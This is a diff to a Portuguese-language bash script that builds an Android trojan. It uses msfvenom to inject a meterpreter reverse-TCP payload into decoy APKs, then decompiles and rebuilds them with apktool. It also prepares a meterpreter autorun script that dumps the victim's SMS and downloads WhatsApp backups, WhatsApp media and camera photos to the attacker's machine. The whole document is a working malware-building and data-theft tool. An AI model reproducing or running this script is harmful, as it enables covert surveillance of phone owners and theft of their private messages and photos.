@@ -28,28 +28,35 @@ echo "Digite o número do template>>"
 read template_num
 
 if [ "$template_num" -eq 1 ]; then
-   template="/home/Ceifador/Downloads/sms.apk"
+   template="sms.apk"
 elif [ "$template_num" -eq 2 ]; then
-   template="/home/Ceifador/Downloads/filezim.apk"
+   template="filezim.apk"
 fi
 echo -e "\e[0m"
 
+
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -x $template -o teste.apk
 echo "payload feito" 
-rm -rf /home/Ceifador/teste/
+rm -rf teste
+#descompilando teste.apk
+echo "descompilando teste.apk..."
 apktool d teste.apk -f
 
-sleep "0.1"
+sleep "1"
 #troca a versão minsdk do apk para a mais recente
-sed -i "s/minSdkVersion: '23'/minSdkVersion: '29'/" /home/Ceifador/teste/apktool.yml
-
+echo "trocando versão sdk para a mais recente(29):"
+sed -i "s/minSdkVersion: '23'/minSdkVersion: '29'/" teste/apktool.yml
 echo "Número da versão minSdk alterado para 29 no arquivo apktool.yml."
 
 
 echo "Substituição concluída."
-apktool b /home/Ceifador/teste -o /home/Ceifador/teste.apk
+#recompilando teste.apk
+echo "recompilando..."
+apktool b teste -o teste.apk
 
-mv /home/Ceifador/teste.apk /media/sf__home_Ceifador
+#movendo pra pasta compartilhada
+echo "movendo pra pasta compartilhada"
+mv teste.apk /media/sf__home_Ceifador/teste.apk
 
 #por isso eu não tenho namorada
 echo "mandando trojan para o mestre Ceifador"
@@ -60,7 +67,7 @@ echo "mandando trojan para o mestre Ceifador"
 
 
 echo "limpando "
-clear
+#limpar aqui 
 
 echo "mandando trojan para o mestre Ceifador"
 #comandos do mscfonsole
@@ -74,15 +81,15 @@ echo "set LPORT 4444" >> comandos_msfconsole.txt
 
 #limpar comandos anteriores
 echo "" > meterpreter.txt
-#downloads de arquivos priorizados
+#downloads de arquivos priorizado
+echo "dump_sms" >> meterpreter.txt
 echo "download -r /storage/emulated/0/Android/media/com.whatsapp/Backups/ /media/sf__home_Ceifador/hack/" >>meterpreter.txt
 echo "download -r /storage/emulated/0/DCIM  /media/sf__home_Ceifador/hack/" >> meterpreter.txt
 echo "download -r /storage/emulated/0/Android/media/com.whatsapp/Media/ /media/sf__home_Ceifador/hack/" >> meterpreter.txt
 echo "download -r /storage/emulated/0/Whatsapp/ /media/sf__home_Ceifador/hack" >> meterpreter.txt
 echo  "run meterpreter.txt" >> meterpreter.txt
 #dumpar sms
-echo "dump_sms" >> meterpreter.txt
-
+echo "dump_sms" >>meterpreter.txt
 #roda comandos do meterpreter nas sessões abertas e seta o script meterpreter
 
 echo "set AutoRunScript meterpreter.txt" >> comandos_msfconsole.txt
